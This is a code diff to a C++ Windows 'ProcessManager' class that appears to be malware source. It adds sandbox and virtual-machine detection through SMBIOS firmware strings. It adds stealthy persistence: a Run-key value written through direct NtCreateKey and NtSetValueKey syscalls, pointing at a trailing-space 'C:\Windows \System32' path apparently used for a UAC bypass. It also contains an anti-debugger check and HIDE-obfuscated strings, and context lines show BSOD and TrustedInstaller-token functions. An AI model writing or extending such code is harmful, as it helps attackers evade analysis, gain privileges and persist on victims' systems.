@@ -151,8 +151,92 @@ void ProcessManager::SetThisContext(SecurityContext newContext) {
         this->m_Context = newContext;
 }
 
+bool ProcessManager::RunningInVirtualMachine() {
+    std::vector<unsigned char> buffer;
+    std::string temp;
+
+    DWORD size = GetSystemFirmwareTable( 'RSMB', 0, nullptr, 0 );
+    if ( size == 0 )
+        return false;
+
+    buffer.resize(size);
+
+    if ( GetSystemFirmwareTable('RSMB', 0, buffer.data(), size) == 0 )
+        return false;
+
+    for ( DWORD i = 0; i < size; ++i ) {
+        if ( isprint(buffer[i]) ) {
+            temp += (char)buffer[i];
+            continue;
+        }
+
+        if ( !temp.empty() ) {
+            std::cout << temp << std::endl;
+            
+            std::string lower = _lower(temp);
+
+            if ( 
+                lower == (char*)HIDE("qemu")                              ||
+                lower.find((char*)HIDE("oracle")) != std::string::npos    ||
+                lower == (char*)HIDE("virtualbox")                        || 
+                lower.find((char*)HIDE("vbox")) != std::string::npos      ||
+                lower.find((char*)HIDE("virtual")) != std::string::npos   ||
+                lower.find((char*)HIDE("vmware")) != std::string::npos    ||
+                lower.find((char*)HIDE("hyper-v")) != std::string::npos   ||
+                lower.find((char*)HIDE("microsoft")) != std::string::npos ||
+                lower.find((char*)HIDE("xen")) != std::string::npos       ||
+                lower.find((char*)HIDE("kvm")) != std::string::npos       
+                )
+                return true;
+        }
+
+        temp.clear();
+    }
+
+    return false;
+}
+
 void ProcessManager::AddProcessToStartup() {
-    // todo
+    OBJECT_ATTRIBUTES obj;
+    InitializeObjectAttributes(&obj, 0, 0, 0, 0);
+
+    std::string hiddenRegPath = std::string(HIDE("\\Registry\\Machine\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"));
+    std::wstring wide = std::wstring(hiddenRegPath.begin(), hiddenRegPath.end());
+
+    UNICODE_STRING reg;
+    reg.Buffer = wide.data();
+    reg.Length = wide.size() * sizeof(wchar_t);
+    reg.MaximumLength = sizeof(reg.Buffer);
+
+    std::string hiddenName = std::string(HIDE("Defaults"));
+    std::wstring name = std::wstring(hiddenName.begin(), hiddenName.end());
+
+    std::string hiddenValue = std::string(HIDE("C:\\Windows \\System32\\ComputerDefaults.exe"));
+    std::wstring value = std::wstring(hiddenValue.begin(), hiddenValue.end());
+
+    UNICODE_STRING valueName;
+    valueName.Buffer = name.data();
+    valueName.Length = name.size() * sizeof(wchar_t);
+    valueName.MaximumLength = sizeof(valueName.Length);
+
+    UNICODE_STRING valueData;
+    valueData.Buffer = value.data();
+    valueData.Length = value.size() * sizeof(wchar_t);
+    valueData.MaximumLength = sizeof(valueData.Length);
+
+    obj.Length = sizeof(OBJECT_ATTRIBUTES);
+    obj.RootDirectory = NULL;
+    obj.ObjectName = &reg;
+    obj.SecurityDescriptor = NULL;
+    obj.SecurityQualityOfService = NULL;
+    obj.Attributes = OBJ_CASE_INSENSITIVE;
+    HANDLE key;
+    
+    GetAndInsertSSN(NTDLL, ( char* ) HIDE("NtCreateKey"));
+    SysNtCreateKey(&key, KEY_ALL_ACCESS, &obj, 0, NULL, REG_OPTION_NON_VOLATILE, NULL);
+
+    GetAndInsertSSN(NTDLL, ( char* ) HIDE("NtSetValueKey"));
+    SysNtSetValueKey(key, &valueName, 0, REG_SZ, (void*)valueData.Buffer, valueData.Length);
 }
 
 void ProcessManager::BSOD() {
@@ -186,12 +270,6 @@ void ProcessManager::LoadAllNatives() {
     LoadNative<::_LoadLibrary>((char*)HIDE("LoadLibraryA"), Kernel32DLL);
 
     this->m_NativesLoaded = TRUE;
-}
-
-ProcessManager::~ProcessManager() {
-    for ( auto& libInfo : this->m_LoadedDLLs )
-        if ( strcmp(_lower(libInfo.first).c_str(), (char*)HIDE("kernel32.dll")) != 0)
-            FreeUsedLibrary(libInfo.first.c_str());
 }
 
 DWORD ProcessManager::PIDFromName(const char* name) {
@@ -438,13 +516,12 @@ HANDLE ProcessManager::GetTrustedInstallerToken() {
     return impersonate;
 }
 
-BOOL ProcessManager::CheckNoDebugger() {
+bool ProcessManager::BeingDebugged() {
     PPEB filePEB = ( PPEB ) GetPebAddress();
     BYTE beingDebugged = filePEB->BeingDebugged;
 
-    if ( beingDebugged ) {
-        return TRUE;
-    }
+    if ( beingDebugged )
+        return true;
 
-    return FALSE;
+    return false;
 }
